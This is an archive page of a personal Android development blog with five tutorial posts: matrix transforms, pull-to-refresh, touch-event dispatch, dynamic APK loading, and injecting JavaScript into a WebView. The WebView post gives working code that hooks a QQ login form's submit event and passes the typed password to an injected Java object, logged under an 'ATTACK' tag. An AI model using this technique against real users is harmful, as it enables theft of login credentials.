<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Archives | Yzx Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Keep Writing">
<meta property="og:type" content="website">
<meta property="og:title" content="Yzx Blog">
<meta property="og:url" content="http://yzx41099298.github.io/archives/">
<meta property="og:site_name" content="Yzx Blog">
<meta property="og:description" content="Keep Writing">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Yzx Blog">
<meta name="twitter:description" content="Keep Writing">

  
    <link rel="alternative" href="/atom.xml" title="Yzx Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  <link rel="stylesheet" href="/css/style.css" type="text/css">

  

</head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Yzx Blog</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><input type="submit" value="&#xF002;" class="search-form-submit"><input type="hidden" name="q" value="site:http://yzx41099298.github.io"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-matrix" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2015/03/23/matrix/" class="article-date">
  <time datetime="2015-03-23T07:57:20.000Z" itemprop="datePublished">2015-03-23</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/03/23/matrix/">Matrix pre post set</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>关于先乘和后乘的问题</p>
<p>由于矩阵的乘法运算不满足交换律，我们在前面曾经多次提及先乘、后乘的问题，即先乘就是矩阵运算中右乘，后乘就是矩阵运算中的左乘。其实先乘、后乘的概念是针对变换操作的时间先后而言的，左乘、右乘是针对矩阵运算的左右位置而言的。以第一部分“二、旋转变换”中围绕某点旋转的情况为例：</p>
<p><img src="image/matrix1.jpg" alt="hello"> </p>
<p>越靠近原图像中像素的矩阵，越先乘，越远离原图像中像素的矩阵，越后乘。事实上，图像处理时，矩阵的运算是从右边往左边方向进行运算的。这就形成了越在右边的矩阵(右乘)，越先运算(先乘)，反之亦然。</p>
<p>当然，在实际中，如果首先指定了一个matrix，比如我们先setRotate()，即指定了上面变换矩阵中，中间的那个矩阵，那么后续的矩阵到底是pre还是post运算，都是相对这个中间矩阵而言的。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yzx41099298.github.io/2015/03/23/matrix/" data-id="cmwnzu7qemznovqn" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-pulltorefresh" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2015/03/19/pulltorefresh/" class="article-date">
  <time datetime="2015-03-19T08:47:13.000Z" itemprop="datePublished">2015-03-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/03/19/pulltorefresh/">下拉刷新的简单实现</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>看了Taurus的下拉刷新代码，参考它的主要思想自己也动手写一个下拉刷新。</p>
<p>首先看一下实现了之后，demo项目中的布局</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;com.yzx.TestPullToRefreshView</div><div class="line">    android:<span class="variable">id=</span><span class="string">"@+id/pull_to_refresh"</span></div><div class="line">    android:<span class="variable">layout_width=</span><span class="string">"match_parent"</span></div><div class="line">    android:<span class="variable">layout_height=</span><span class="string">"match_parent"</span>&gt;</div><div class="line"></div><div class="line">    &lt;ListView</div><div class="line">        android:<span class="variable">id=</span><span class="string">"@+id/list_view"</span></div><div class="line">        android:<span class="variable">divider=</span><span class="string">"@null"</span></div><div class="line">        android:<span class="variable">dividerHeight=</span><span class="string">"0dp"</span></div><div class="line">        android:<span class="variable">fadingEdge=</span><span class="string">"none"</span></div><div class="line">        android:<span class="variable">layout_width=</span><span class="string">"match_parent"</span></div><div class="line">        android:<span class="variable">layout_height=</span><span class="string">"match_parent"</span> /&gt;</div><div class="line"></div><div class="line">&lt;/com.yzx.TestPullToRefreshView&gt;</div></pre></td></tr></table></figure>

<p>这里的TestPullToRefreshView就是我们的下拉刷新自定义view。主要的思路就是在TestPullToRefreshView中添加一个RefreshView作为刷新的View。然后通过onTouchEvent来计算位移，再通过offsetTopAndBottom函数来控制ListView和RefreshView所显示的位置。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="annotation">@Override</span></div><div class="line">    <span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onTouchEvent</span>(MotionEvent ev) {</div><div class="line">        <span class="keyword">final</span> <span class="keyword">int</span> action = MotionEventCompat.getActionMasked(ev);</div><div class="line"></div><div class="line">        <span class="keyword">switch</span> (action) {</div><div class="line">            <span class="keyword">case</span> MotionEventCompat.ACTION_POINTER_DOWN:</div><div class="line">                <span class="keyword">final</span> <span class="keyword">int</span> index = MotionEventCompat.getActionIndex(ev);</div><div class="line">                mActivePointerId = MotionEventCompat.getPointerId(ev, index);</div><div class="line"></div><div class="line">                <span class="keyword">final</span> <span class="keyword">float</span> initialMotionY = getMotionEventY(ev, mActivePointerId);</div><div class="line">                <span class="keyword">if</span> (initialMotionY == -<span class="number">1</span>) {</div><div class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">                }</div><div class="line">                mInitialMotionY = initialMotionY;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> MotionEvent.ACTION_MOVE: {</div><div class="line">                <span class="keyword">int</span> offset = calOffset(ev);</div><div class="line">                <span class="keyword">if</span> (offset == -<span class="number">1</span>) {</div><div class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">                }</div><div class="line"></div><div class="line">                setTargetOffsetTop(offset);</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            }</div><div class="line">            <span class="keyword">case</span> MotionEventCompat.ACTION_POINTER_UP:</div><div class="line">            <span class="keyword">case</span> MotionEvent.ACTION_UP:</div><div class="line">            <span class="keyword">case</span> MotionEvent.ACTION_CANCEL: {</div><div class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">            }</div><div class="line">        }</div><div class="line"></div><div class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">    }</div></pre></td></tr></table></figure>

<p>calOffset方法根据下拉距离计算RefreshView显示大小，setTargetOffsetTop用来实现ListView的上下滑动。<br>下面方法是根据Taurus中的计算方法来计算位移值</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">calOffset</span>(MotionEvent ev) {</div><div class="line">        <span class="keyword">final</span> <span class="keyword">int</span> pointerIndex = MotionEventCompat.findPointerIndex(ev, mActivePointerId);</div><div class="line">        <span class="keyword">if</span> (pointerIndex &lt; <span class="number">0</span>) {</div><div class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</div><div class="line">        }</div><div class="line"></div><div class="line">        <span class="keyword">final</span> <span class="keyword">float</span> y = MotionEventCompat.getY(ev, pointerIndex);</div><div class="line">        <span class="keyword">final</span> <span class="keyword">float</span> yDiff = y - mInitialMotionY;</div><div class="line">        <span class="keyword">final</span> <span class="keyword">float</span> scrollTop = yDiff * DRAG_RATE;</div><div class="line">        mCurrentDragPercent = scrollTop / mTotalDragDistance;</div><div class="line">        <span class="keyword">if</span> (mCurrentDragPercent &lt; <span class="number">0</span>) {</div><div class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</div><div class="line">        }</div><div class="line">        <span class="keyword">float</span> boundedDragPercent = Math.min(<span class="number">1</span>f, Math.abs(mCurrentDragPercent));</div><div class="line">        <span class="keyword">float</span> extraOS = Math.abs(scrollTop) - mTotalDragDistance;</div><div class="line">        <span class="keyword">float</span> slingshotDist = mTotalDragDistance;</div><div class="line">        <span class="keyword">float</span> tensionSlingshotPercent = Math.max(<span class="number">0</span>, Math.min(extraOS, slingshotDist * <span class="number">2</span>) / slingshotDist);</div><div class="line">        <span class="keyword">float</span> tensionPercent = (<span class="keyword">float</span>) ((tensionSlingshotPercent / <span class="number">4</span>) - Math.pow(</div><div class="line">                (tensionSlingshotPercent / <span class="number">4</span>), <span class="number">2</span>)) * <span class="number">2</span>f;</div><div class="line">        <span class="keyword">float</span> extraMove = (slingshotDist) * tensionPercent / <span class="number">2</span>;</div><div class="line">        <span class="keyword">int</span> targetY = (<span class="keyword">int</span>) ((slingshotDist * boundedDragPercent) + extraMove);</div><div class="line"></div><div class="line">        <span class="keyword">return</span> targetY - mCurrentOffsetTop;</div><div class="line">    }</div></pre></td></tr></table></figure>

<p>下面方法是具体条用offsetTopAndBottom的方法。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setTargetOffsetTop</span>(<span class="keyword">int</span> offset, <span class="keyword">boolean</span> requiresUpdate) {</div><div class="line">    mTarget.offsetTopAndBottom(offset);</div><div class="line">    mTestDrawable.offsetTopAndBottom(offset);</div><div class="line">    mCurrentOffsetTop = mTarget.getTop();</div><div class="line">    <span class="keyword">if</span> (requiresUpdate && android.os.Build.VERSION.SDK_INT &lt; <span class="number">11</span>) {</div><div class="line">        invalidate();</div><div class="line">    }</div><div class="line">}</div></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://yzx41099298.github.io/2015/03/19/pulltorefresh/" data-id="bc1jbmwg05vjd72u" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-WebViewJS" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2015/03/16/WebViewJS/" class="article-date">
  <time datetime="2015-03-16T07:23:30.000Z" itemprop="datePublished">2015-03-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/03/16/WebViewJS/">在WebView中添加JS</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>首先向WebView注入Java对象，在WebView加载完毕的时候执行一段js，给表单提交事件关联上我们的代码，即让表单提交的时候执行所注入的Java对象的一个方法，js执行我们的方法的时候可以把qq号和密码作为参数传递过来，然后我们就可以保存了。下面的步骤只示范如何把qq密码存下来。</p>
<p>1. 声明要注入的Java对象</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SavePasswordJavaScriptInterface</span>    </span></div><div class="line">{    </div><div class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">savePassword</span>(<span class="keyword">final</span> String password)  </div><div class="line">    {    </div><div class="line">        Log.w(<span class="string">"ATTACK"</span>, <span class="string">"enter spjsinterface:"</span>+ password);  </div><div class="line">        mHandler.post(<span class="keyword">new</span> Runnable()  </div><div class="line">        {    </div><div class="line">            <span class="annotation">@Override</span>    </div><div class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span>()  </div><div class="line">            {  </div><div class="line">                <span class="comment">//这里就是用户登录的密码了，你可以存起来了  </span></div><div class="line">                mPassword = password;  </div><div class="line">                Log.w(<span class="string">"ATTACK"</span>, mPassword);  </div><div class="line">            }    </div><div class="line">        });    </div><div class="line">    }   </div><div class="line">}</div></pre></td></tr></table></figure>

<p>2. 注入上述对象</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//这里是注入Java对象  </span></div><div class="line">mWebView.addJavascriptInterface(<span class="keyword">new</span> SavePasswordJavaScriptInterface(), <span class="string">"SPJSInterface"</span>);  </div><div class="line"><span class="comment">//这里是打开登录平台页面  </span></div><div class="line">mWebView.loadUrl(LOGIN_URL);</div></pre></td></tr></table></figure>

<p>3. 在WebViewClient中的onPageFinished方法中注入js，这样当登录的时候就会调用我们之前注入的Java对象，同时乖乖地把密码作为参数传过来</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="annotation">@Override</span>  </div><div class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onPageFinished</span>(WebView view, String url)  </div><div class="line">{  </div><div class="line">    <span class="keyword">super</span>.onPageFinished(view, url);  </div><div class="line">    <span class="comment">//仅当是登录url的时候才注入我们的js，不要任何url都注入  </span></div><div class="line">    <span class="keyword">if</span> (url.equals(LOGIN_URL)) {  </div><div class="line">        <span class="comment">//要注入的js  </span></div><div class="line">        String js = <span class="string">"document.forms[0].onsubmit=function(event){var pwd = document.getElementById(\"ptlogin-password\").value;window.SPJSInterface.savePassword(pwd);return false;}"</span>;  </div><div class="line">        Log.w(<span class="string">"ATTACK"</span>, <span class="string">"inject js, js= "</span> + js);  </div><div class="line">        view.loadUrl(<span class="string">"javascript:"</span> + js);  </div><div class="line">    }  </div><div class="line">}</div></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://yzx41099298.github.io/2015/03/16/WebViewJS/" data-id="2ln9ndjqtku1yiry" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-TouchEvent" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2015/03/13/TouchEvent/" class="article-date">
  <time datetime="2015-03-13T10:40:07.000Z" itemprop="datePublished">2015-03-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/03/13/TouchEvent/">TouchEvent派发机制</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Android的事件派发机制其实这是一种典型的消息“冒泡”机制，很多平台采用这个机制，消息最先到达最底层View，然后它先进行判断是不是它所需要的，否则就将消息传递给它的子View，这样一来，消息就从水底的气泡一样向上浮了一点距离，以此类推，气泡达到顶部和空气接触，破了（消息被处理了），当然也有气泡浮出到顶层了，还没破（消息无人处理），这个消息将由系统来处理，对于Android来说，会由Activity来处理。</p>
<p>点击事件用MotionEvent来表示，当一个点击操作发生时，事件最先传递给当前Activity，由Activity的dispatchTouchEvent来进行事件派发，具体的工作是由Activity内部的Window来完成的，Window会将事件传递给decor view，由于DecorView 继承自FrameLayout且是我们的父View，所以最终事件会传递给我们的View。点击事件到底层View（一般是一个ViewGroup）以后，会调用ViewGroup的dispatchTouchEvent方法，然后的逻辑是这样的：如果底层ViewGroup拦截事件即onInterceptTouchEvent返回true，则事件由ViewGroup处理，这个时候，如果ViewGroup的mOnTouchListener被设置，则会onTouch会被调用，否则，onTouchEvent会被调用，也就是说，如果都提供的话，onTouch会屏蔽掉onTouchEvent。在onTouchEvent中，如果设置了mOnClickListener，则onClick会被调用。如果顶层ViewGroup不拦截事件，则事件会传递给它的在点击事件链上的子View，这个时候，子View的dispatchTouchEvent会被调用，子View的dispatchTouchEvent会调用 OnTouchEvent, 而没有viewGroup的onInterceptTouchEvent方法。到此为止，事件已经从最底层View传递给了上一层View，接下来的行为和其底层View一致，如此循环，完成整个事件派发。另外要说明的是，ViewGroup默认是不拦截点击事件的，其onInterceptTouchEvent返回false。</p>
<p>如果一个点击事件，子View的onTouchEvent返回了false，则父View的onTouchEvent会被直接调用，以此类推。如果所有的View都不处理，则最终会由Activity来处理，这个时候，Activity的onTouchEvent会被调用。</p>
<p>例子如下：<br>下面用一个简单的实验说明上述复杂的规则。视图自底向上共3层，其中LayoutView1和LayoutView2就是LinearLayout， MyTextView就是TextView：<br>对应的xml布局文件如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">&lt;?xml <span class="variable">version=</span><span class="string">"1.0"</span> <span class="variable">encoding=</span><span class="string">"utf-8"</span>?&gt;</div><div class="line">&lt;com.touchstudy.LayoutView1 xmlns:<span class="variable">android=</span><span class="string">"http://schemas.android.com/apk/res/android"</span></div><div class="line">    android:<span class="variable">orientation=</span><span class="string">"vertical"</span></div><div class="line">    android:<span class="variable">layout_width=</span><span class="string">"fill_parent"</span></div><div class="line">    android:<span class="variable">layout_height=</span><span class="string">"fill_parent"</span> ]]&gt;</div><div class="line">    &lt;com.touchstudy.LayoutView2</div><div class="line">        android:<span class="variable">orientation=</span><span class="string">"vertical"</span></div><div class="line">        android:<span class="variable">layout_width=</span><span class="string">"fill_parent"</span></div><div class="line">        android:<span class="variable">layout_height=</span><span class="string">"fill_parent"</span></div><div class="line">        android:<span class="variable">gravity=</span><span class="string">"center"</span>]]&gt;</div><div class="line">       &lt;com.touchstudy.MyTextView </div><div class="line">            android:<span class="variable">layout_width=</span><span class="string">"wrap_content"</span></div><div class="line">            android:<span class="variable">layout_height=</span><span class="string">"wrap_content"</span></div><div class="line">            android:<span class="variable">id=</span><span class="string">"@+id/tv"</span></div><div class="line">            android:<span class="variable">text=</span><span class="string">"AB"</span></div><div class="line">            android:<span class="variable">textSize=</span><span class="string">"40sp"</span></div><div class="line">            android:<span class="variable">textStyle=</span><span class="string">"bold"</span></div><div class="line">            android:<span class="variable">background=</span><span class="string">"#FFFFFF"</span></div><div class="line">            android:<span class="variable">textColor=</span><span class="string">"#0000FF"</span>/&gt;</div><div class="line">   &lt;/com.touchstudy.LayoutView2]]&gt;</div><div class="line">&lt;/com.touchstudy.LayoutView1]]&gt;</div></pre></td></tr></table></figure>

<p>下面看具体情况：<br>1. onInterceptTouchEvent()处理down事件均返回false，onTouchEvent()处理事件均返回true</p>
<hr>
<p>04-11 03:58:42.620: DEBUG/LayoutView1(614): onInterceptTouchEvent action:ACTION_DOWN<br>04-11 03:58:42.620: DEBUG/LayoutView2(614): onInterceptTouchEvent action:ACTION_DOWN<br>04-11 03:58:42.620: DEBUG/MyTextView(614): onTouchEvent action:ACTION_DOWN<br>04-11 03:58:42.800: DEBUG/LayoutView1(614): onInterceptTouchEvent action:ACTION_MOVE<br>04-11 03:58:42.800: DEBUG/LayoutView2(614): onInterceptTouchEvent action:ACTION_MOVE<br>04-11 03:58:42.800: DEBUG/MyTextView(614): onTouchEvent action:ACTION_MOVE<br>…… //省略过多的ACTION_MOVE<br>04-11 03:58:43.130: DEBUG/LayoutView1(614): onInterceptTouchEvent action:ACTION_UP<br>04-11 03:58:43.130: DEBUG/LayoutView2(614): onInterceptTouchEvent action:ACTION_UP<br>04-11 03:58:43.150: DEBUG/MyTextView(614): onTouchEvent action:ACTION_UP</p>
<hr>
<p>这是最常见的情况，onInterceptTouchEvent并没有做任何改变事件传递时序的操作，效果上和没有覆写该方法是一样的。可以看到，各种事件的传递本身是自底向上的，次序是：LayoutView1-&gt;LayoutView2-&gt;MyTextView。注意，在onInterceptTouchEvent均返回false时，LayoutView1和LayoutView2的onTouchEvent并不会收到事件，而是最终传递给了MyTextView。</p>
<p>2. LayoutView1的onInterceptTouchEvent()处理down事件返回true，<br>MyTextView的onTouchEvent()处理事件返回true</p>
<hr>
<p>04-11 03:09:27.589: DEBUG/LayoutView1(446): onInterceptTouchEvent action:ACTION_DOWN<br>04-11 03:09:27.589: DEBUG/LayoutView1(446): onTouchEvent action:ACTION_DOWN<br>04-11 03:09:27.629: DEBUG/LayoutView1(446): onTouchEvent action:ACTION_MOVE<br>04-11 03:09:27.689: DEBUG/LayoutView1(446): onTouchEvent action:ACTION_MOVE<br>…… //省略过多的ACTION_MOVE<br>04-11 03:09:27.959: DEBUG/LayoutView1(446): onTouchEvent action:ACTION_UP</p>
<hr>
<p>从Log可以看到，由于LayoutView1在拦截第一次down事件时return true，所以后续的事件（包括第一次的down）将由LayoutView1本身处理，事件不再传递下去。</p>
<p>3. LayoutView1，LayoutView2的onInterceptTouchEvent()处理down事件返回false，<br>MyTextView的onTouchEvent()处理事件返回false<br>LayoutView2的onTouchEvent()处理事件返回true</p>
<hr>
<p>04-11 09:50:21.147: DEBUG/LayoutView1(301): onInterceptTouchEvent action:ACTION_DOWN<br>04-11 09:50:21.147: DEBUG/LayoutView2(301): onInterceptTouchEvent action:ACTION_DOWN<br>04-11 09:50:21.147: DEBUG/MyTextView(301): onTouchEvent action:ACTION_DOWN<br>04-11 09:50:21.147: DEBUG/LayoutView2(301): onTouchEvent action:ACTION_DOWN<br>04-11 09:50:21.176: DEBUG/LayoutView1(301): onInterceptTouchEvent action:ACTION_MOVE<br>04-11 09:50:21.176: DEBUG/LayoutView2(301): onTouchEvent action:ACTION_MOVE<br>04-11 09:50:21.206: DEBUG/LayoutView1(301): onInterceptTouchEvent action:ACTION_MOVE<br>04-11 09:50:21.217: DEBUG/LayoutView2(301): onTouchEvent action:ACTION_MOVE<br>…… //省略过多的ACTION_MOVE<br>04-11 09:50:21.486: DEBUG/LayoutView1(301): onInterceptTouchEvent action:ACTION_UP<br>04-11 09:50:21.486: DEBUG/LayoutView2(301): onTouchEvent action:ACTION_UP</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yzx41099298.github.io/2015/03/13/TouchEvent/" data-id="cf6yqp8srnwqqjde" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-dl" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2015/03/13/dl/" class="article-date">
  <time datetime="2015-03-13T07:27:38.000Z" itemprop="datePublished">2015-03-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/03/13/dl/">Android apk动态加载机制</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>apk动态加载机制就是在未安装apk的情况下运行外部apk，好酷炫的感觉，这样的好处就是动态部署，热插拔，松耦合，降低应用内存cpu占用，但是实现起来比较复杂。</p>
<p>1. 想要运行apk我们可以通过宿主程序去动态加载apk文件并将其放在自己的进程中执行。首先需要宿主程序到文件系统中去加载apk, 理论上可以用到的有DexClassLoader、PathClassLoader和URLClassLoader。</p>
<ul>
<li>DexClassLoader ：可以加载文件系统上的jar、dex、apk</li>
<li>PathClassLoader ：可以加载/data/app目录下的apk，这也意味着，它只能加载已经安装的apk</li>
<li>URLClassLoader ：可以加载java中的jar，但是由于dalvik不能直接识别jar，所以此方法在android中无法使用，尽管还有这个类<br>采用DexClassLoader去加载apk，然后如果没有指定class，就调起主activity，否则调起指定的class。activity被调起的过程是这样的：首先通过类加载器去加载apk中activity的类并创建一个新对象，然后通过反射去调用这个对象的setProxy方法和onCreate方法，setProxy方法的作用是将activity内部的执行全部交由宿主程序中的proxy（也是一个activity），onCreate方法是activity的入口，setProxy以后就调用onCreate方法，这个时候activity就被调起来了。</li>
</ul>
<p>2. 资源管理：因为插件是在宿主程序中运行的，所以是运行在宿主程序的context中，所以先要使用自己的资源还需要想一些办法。<br>activity的工作主要是由ContextImpl来完成的， 它在activity中是一个叫做mBase的成员变量。注意到Context中有如下两个抽象方法，看起来是和资源有关的，实际上context就是通过它们来获取资源的，这两个抽象方法的真正实现在ContextImpl中。也即是说，只要我们自己实现这两个方法，就可以解决资源问题了。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="javadoc">/** Return an AssetManager instance for your application's package. */</span></div><div class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> AssetManager <span class="title">getAssets</span>();</div><div class="line"><span class="javadoc">/** Return a Resources instance for your application's package. */</span></div><div class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> Resources <span class="title">getResources</span>();</div></pre></td></tr></table></figure>

<p>下面看一下如何实现这两个方法<br>首先要加载apk中的资源：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">loadResources</span>() {  </div><div class="line">    <span class="keyword">try</span> {  </div><div class="line">        AssetManager assetManager = AssetManager.class.newInstance();  </div><div class="line">        Method addAssetPath = assetManager.getClass().getMethod(<span class="string">"addAssetPath"</span>, String.class);  </div><div class="line">        addAssetPath.invoke(assetManager, mDexPath);  </div><div class="line">        mAssetManager = assetManager;  </div><div class="line">    } <span class="keyword">catch</span> (Exception e) {  </div><div class="line">        e.printStackTrace();  </div><div class="line">    }  </div><div class="line">    Resources superRes = <span class="keyword">super</span>.getResources();  </div><div class="line">    mResources = <span class="keyword">new</span> Resources(mAssetManager, superRes.getDisplayMetrics(),  </div><div class="line">            superRes.getConfiguration());  </div><div class="line">    mTheme = mResources.newTheme();  </div><div class="line">    mTheme.setTo(<span class="keyword">super</span>.getTheme());  </div><div class="line">}</div></pre></td></tr></table></figure>

<p>说明：加载的方法是通过反射，通过调用AssetManager中的addAssetPath方法，我们可以将一个apk中的资源加载到Resources中，由于addAssetPath是隐藏api我们无法直接调用，所以只能通过反射，下面是它的声明，通过注释我们可以看出，传递的路径可以是zip文件也可以是一个资源目录，而apk就是一个zip，所以直接将apk的路径传给它，资源就加载到AssetManager中了，然后再通过AssetManager来创建一个新的Resources对象，这个对象就是我们可以使用的apk中的资源了，这样我们的问题就解决了。</p>
<p>3. Activity的生命周期：<br>将activity的大部分生命周期方法提取出来作为一个接口（DLPlugin），然后通过代理activity（DLProxyActivity）去调用插件activity实现的生命周期方法，这样就完成了插件activity的生命周期管理，并且没有采用反射，当我们想增加一个新的生命周期方法的时候，只需要在接口中声明一下同时在代理activity中实现一下即可</p>
<p>以上解决了动态加载的一些基本问题，另外还有很多问题需要一步步实现。<br>更多详细的内容可以查看singwhatiwanna的csdn博客及github开源项目<br><a href="http://blog.csdn.net/singwhatiwanna/article/details/39937639" target="_blank" rel="external">http://blog.csdn.net/singwhatiwanna/article/details/39937639</a><br><a href="https://github.com/singwhatiwanna/dynamic-load-apk" target="_blank" rel="external">https://github.com/singwhatiwanna/dynamic-load-apk</a> </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yzx41099298.github.io/2015/03/13/dl/" data-id="02y8ep9ybmto14i8" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
